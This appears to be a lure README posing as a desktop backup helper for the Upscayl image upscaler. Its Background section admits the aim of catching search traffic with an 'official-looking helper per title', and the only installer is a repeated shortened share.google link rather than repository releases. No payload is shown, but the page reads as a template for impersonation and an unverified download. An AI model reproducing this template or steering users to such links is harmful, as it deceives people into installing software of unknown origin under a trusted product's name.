![Upscayl Desktop](assets/hero.png)

# Upscayl Desktop

*Archive Upscayl files on this machine before you change the install.*

## Overview

**Upscayl Desktop** is a desktop utility. Keep Upscayl data folders on disk: dated copies of config and export files before a patch.

Patches move Upscayl data paths without warning.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- Locates Upscayl user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Background

Search traffic for Upscayl is the product name plus desktop.

Keep one official-looking helper per title.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/tcook6716/upscayl-desktop

MIT license. See `LICENSE`.
